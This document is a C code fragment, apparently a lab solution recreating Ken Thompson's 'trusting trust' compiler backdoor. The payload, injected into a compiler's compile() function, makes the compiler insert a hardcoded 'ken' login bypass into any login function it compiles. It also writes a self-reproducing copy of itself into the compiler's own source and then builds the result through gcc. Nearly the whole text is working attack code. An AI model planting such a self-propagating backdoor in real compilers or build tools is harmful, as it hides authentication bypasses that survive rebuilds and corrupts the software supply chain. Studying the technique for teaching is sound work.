// payload injected into victim compiler's compile() after assert(fp);

static char login_sig[] = "int login(char *user) {";
static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";

static char compile_sig[] =
        "static void compile(char *program, char *outname) {\n"
        "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
        "    assert(fp);";

char *p2;

if ((p2 = strstr(program, login_sig))) {
    int k2 = (int)(p2 - program);
    fprintf(fp, "%.*s", k2, program);
    fprintf(fp, "%s", login_sig);
    fprintf(fp, "\n\t%s\n", login_attack);
    fprintf(fp, "%s", p2 + strlen(login_sig));

} else if ((p2 = strstr(program, compile_sig))) {
    int k2 = (int)(p2 - program);

    // copy everything up to compile_sig
    fprintf(fp, "%.*s", k2, program);

    // write compile_sig
    fprintf(fp, "%s\n", compile_sig);

    // self-reproducing part: emit prog[] and then emit the payload source
    fprintf(fp, "char prog[] = {\n");
    for (int i = 0; prog[i]; i++)
        fprintf(fp, "\t%d,%c", prog[i], (i+1)%8==0 ? '\n' : ' ');
    fprintf(fp, "0 };\n");
    fprintf(fp, "%s", prog);

    // resume after compile_sig in victim source
    fprintf(fp, "%s", p2 + strlen(compile_sig));

} else {
    // normal behavior
    fprintf(fp, "%s", program);
}

fclose(fp); 

// compile with gcc (same as in compile.c)
char buf_attack[1024];
sprintf(buf_attack, "gcc ./temp-out.c -o %s", outname);
if(system(buf_attack) != 0)
    error("system failed\n");

return;
